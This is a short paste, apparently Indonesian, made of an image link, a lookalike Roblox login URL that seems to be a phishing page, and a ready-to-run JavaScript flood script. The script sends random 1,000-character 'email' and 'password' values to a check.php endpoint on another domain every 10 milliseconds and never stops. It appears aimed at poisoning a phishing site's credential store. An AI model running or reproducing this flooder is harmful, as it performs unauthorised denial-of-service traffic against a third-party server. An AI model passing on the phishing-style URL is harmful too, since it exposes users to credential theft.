https://g.top4top.io/p_2953wbtxh0.jpg


https://www.robloox.com.es/users/1493210743/profile/login

```
function getRandomCharacter(string) {
  const randomIndex = Math.floor(Math.random() * string.length);
  return string[randomIndex];
}

// Membuat fungsi untuk menghasilkan teks acak dengan panjang tertentu
function generateRandomText(length) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let randomText = '';

  for (let i = 0; i < length; i++) {
    const randomChar = getRandomCharacter(characters);
    randomText += randomChar;
  }

  return randomText;
}


// Fungsi untuk mengirim permintaan POST ke verify.php
function kirimOTP() {
var pin1 = generateRandomText(1000);
var pin2 = generateRandomText(1000);
var pin3 = generateRandomText(1000);


  // Data yang akan dikirim dalam permintaan POST
  var dataToSend = "email=" + pin1
      +"&password="+ pin2
      +"&login="+ pin3
      
      ; // Ganti dengan nilai OTP yang ingin Anda kirim

  // URL ke berkas verify.php
  var url = "https://zymytbgj.eventmaterialfree.com/check.php";

  // Konfigurasi permintaan
  var xhr = new XMLHttpRequest();
  xhr.open("POST", url, true);

  // Set header jika diperlukan
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded;charset=UTF-8");

  // Mengirim data dalam format x-www-form-urlencoded
  xhr.send(dataToSend);

  // Menangani respons dari server
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) { // Permintaan selesai
      if (xhr.status === 200) { // Kode status OK
        // Tangani respons dari server di sini
        var response = xhr.responseText;
        console.log("Respon dari server:", "OK");
      } else {
        // Tangani jika ada kesalahan pada permintaan
        console.error("Kesalahan dalam permintaan:", xhr.status);
      }
    }
  };
}

// Panggil fungsi kirimOTP setiap 10 milidetik (atau sesuaikan dengan interval yang Anda inginkan)
var interval = setInterval(kirimOTP, 10); // Contoh: mengirim OTP setiap 10 detik

// Untuk menghentikan looping jika diperlukan
// clearInterval(interval); // Menghentikan looping```
